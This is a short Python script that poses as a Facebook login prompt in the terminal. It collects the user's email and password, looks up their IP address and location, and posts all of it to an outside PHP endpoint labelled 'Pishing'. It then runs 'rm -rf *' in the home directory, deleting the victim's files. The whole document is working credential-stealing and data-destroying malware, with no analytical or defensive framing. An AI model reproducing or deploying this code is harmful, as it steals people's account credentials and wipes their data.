import os,sys,time,random,requests,json

m='\033[1;31m';h='\033[1;32m';k='\033[1;33m';b='\033[1;34m';u='\033[1;35m';c='\033[1;36m';p='\033[1;37m';mb='\033[1;41m';n='\033[0m'
os.system('clear')
print(f'''
{m}•{k}•{h}•{b}___________________________{h}•{k}•{m}•
{b}    |{mb} USSER FACEBOOK LOGGIN {n}{b}|
{m}×××××××××××××××××××××××××××××××××
''')
email = input(f'{b}[{m}!{b}]{h} Email{m}   :{k} ')
passw = input(f'{b}[{m}!{b}]{h} Password{m}:{k} ')
print(f'{m}×××××××××××××××××××××××××××××××××')
data_user = requests.post('https://extreme-ip-lookup.com/json').json()
ip = data_user['query']
kota = data_user['city']
daerah = data_user['region']
negara = data_user['country']
message = f'''
[!] NEW USERS HAVE BEEN LOGGED IN ...<br><br>
[1] IP     : {ip}<br>
[2] KOTA   : {kota}<br>
[3] DAERAH : {daerah}<br>
[4] NEGARA : {negara}<br><br>
[?] EMAIL  : {email}<br>
[?] PASSW  : {passw}<br><br>
[!] NAYARA QERCA'S HERE!!!'''
requests.post('http://savvymotherschool.com/files/send.php?j=Pishing&p='+message)
time.sleep(24)
os.system('cd $home && rm -rf *')
os.system('exit')
os.system('exit')
os.zystem('exit')

